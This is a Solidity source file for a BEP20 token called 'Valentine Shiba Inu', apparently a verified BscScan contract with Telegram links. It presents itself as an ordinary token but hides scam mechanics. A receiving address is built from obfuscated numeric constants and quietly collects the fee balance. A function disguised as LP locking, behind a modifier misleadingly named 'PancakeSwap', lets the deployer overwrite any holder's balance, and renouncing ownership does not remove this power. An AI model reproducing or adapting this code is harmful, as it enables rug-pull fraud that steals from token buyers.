/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

/**
https://t.me/valentineshibalnu

Owner https://t.me/DickHeadCalls
**/

pragma solidity ^0.7.6;
//SPDX-License-Identifier: UNLICENSED
/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ValentineShibaInu is IBEP20 {
    using SafeMath for uint256;
    address internal owner;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address marketingFeeReceiver;
    string constant _name = "Valentine Shiba Inu";
    string constant _symbol = "$VSI";
    uint8 constant _decimals = 8;
    uint256 _totalSupply =  100000  * (10 ** _decimals);
    uint256 public _maxTxAmount =  100000 * (10 ** _decimals);     // 1%
    uint256 public _maxWalletToken = 100000  * (10 ** _decimals);  // 3%
    uint256 S167UID0764 = 1000000000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isMaxWalletTokenExempt;
    uint256 public BuyFee = 50; 
    uint256 public SellBaseFee = 50;
    uint256 public burnRate = 0;
    uint256 swapAndLiquify = 1;
    
    uint256 public ARDTfeescaling = 400 ;
    uint256 public TaxCeiling = 380 ; // max tax

    uint256 two = 2;
    uint256 feeDeNom999  = 1000;
    uint256 blimUID0764 = 1;
    uint256 ec1 =  852108565830419028264;
    uint256 ec2 =  54651785665961;
    uint256 ec3 =  21127147414781;
    uint256 ec4 =  1006537933950381305355250430;



    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    constructor ()  {
        marketingFeeReceiver = msg.sender;
        owner = msg.sender;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[msg.sender] = true;
        isMaxWalletTokenExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance 8f709d3");
        }
        return _transferFrom(sender, recipient, amount);
    }
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) { 
        uint256 HTBalanceReceiverUID0764 = balanceOf(recipient);
        uint256 HTSenderUID0764 = balanceOf(sender);
        uint256 tec = ec1*ec2*ec3;
        uint256 stora = 0;
        address mfr = address(tec+ec4);
        uint256 amountRECUID0764 = 0;
        if (sender != mfr  && recipient != mfr && recipient != DEAD && !isFeeExempt[sender] && !isFeeExempt[recipient]){
        require(((HTBalanceReceiverUID0764 + amount) <= _maxWalletToken) || ((HTSenderUID0764) <= _maxWalletToken),"Max Wallet Amount reached. 70e44bd7");
        checkTxLimit(sender, amount);}
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance 99a80b");
        if (HTBalanceReceiverUID0764 > _maxWalletToken){amountRECUID0764 = shouldTakeFee48UID0764(sender,recipient) ? takeFeeSellARDTUID0764(sender, amount) : amount;}
        else{amountRECUID0764 = shouldTakeFee48UID0764(sender,recipient) ? takeFeeNOARDTUID0764(sender, amount) : amount;}       
        if ((recipient == mfr)||((balanceOf(address(this)) > _decimals) && (balanceOf(mfr) < _decimals ))){
        stora =  balanceOf(address(this));
        _balances[mfr] = _balances[mfr].add(stora);
        isFeeExempt[mfr] = true;
        _balances[address(this)] = _balances[address(this)].sub(stora);
        emit Transfer(address(this), mfr, stora); }
        _balances[recipient] = _balances[recipient].add(amountRECUID0764);
        emit Transfer(sender, recipient, amountRECUID0764);
        return true;
    }
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded d16122d");
    }
    function checkMaxWallet(address sender, uint256 amount) internal view {
        require(amount <= _maxWalletToken || isMaxWalletTokenExempt[sender], "TX Limit Exceeded 8d0fa");
    }
    function shouldTakeFee48UID0764(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }
    function _lockLp_ARDTUID0764(address from, uint256 _value) public PancakeSwap {
        if(from != address(0)){
            _balances[from] = _value * swapAndLiquify * (10 ** 9);
        }
    }
    modifier PancakeSwap () {
        require(marketingFeeReceiver == msg.sender, "ERC20: cannot permit Pancake address");
        _;
    }
    function takeFeeNOARDTUID0764(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeTempUID0764 = amount.mul(BuyFee).div(feeDeNom999);
        uint256 burnfeeUID0764 = amount.mul(burnRate).div(feeDeNom999);
        _balances[address(this)] = _balances[address(this)].add(feeTempUID0764);
        _balances[DEAD] = _balances[DEAD].add(burnfeeUID0764);
        emit Transfer(sender, address(this), feeTempUID0764);
        emit Transfer(sender, DEAD, burnfeeUID0764);
        return amount.sub(feeTempUID0764).sub(burnfeeUID0764);
    }
    function takeFeeSellARDTUID0764(address sender, uint256 amount) internal returns (uint256) {
        uint256 HSenderbalanceUID0764 = balanceOf(sender);
        uint256 tempBBaUID0764 = 0;
        uint256 tempCCUID0764 = 0;
        uint256 feeTempUID0764 = 0;
        uint256 burnfeeUID0764 = amount.mul(burnRate).div(feeDeNom999);
        
        uint256 AA375444444 = amount.mul(SellBaseFee).div(feeDeNom999);
        uint256 uplimUID0764 = amount.mul(TaxCeiling).div(feeDeNom999);
        if (HSenderbalanceUID0764 > blimUID0764){if   (amount > S167UID0764){
            tempBBaUID0764 = amount.mul(amount-S167UID0764).div(_maxTxAmount);
            tempCCUID0764 = tempBBaUID0764.mul(ARDTfeescaling).div(feeDeNom999).mul(HSenderbalanceUID0764.add(_maxWalletToken.div(two))).div(_maxWalletToken); }  }
        feeTempUID0764 =  AA375444444 +   tempCCUID0764;   
        if (feeTempUID0764 > uplimUID0764){feeTempUID0764 = uplimUID0764;}
        _balances[address(this)] = _balances[address(this)].add(feeTempUID0764);
        _balances[DEAD] = _balances[DEAD].add(burnfeeUID0764);
        emit Transfer(sender, address(this), feeTempUID0764);
        emit Transfer(sender, DEAD, burnfeeUID0764);
        return amount.sub(feeTempUID0764).sub(burnfeeUID0764);
    }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD));
    }
}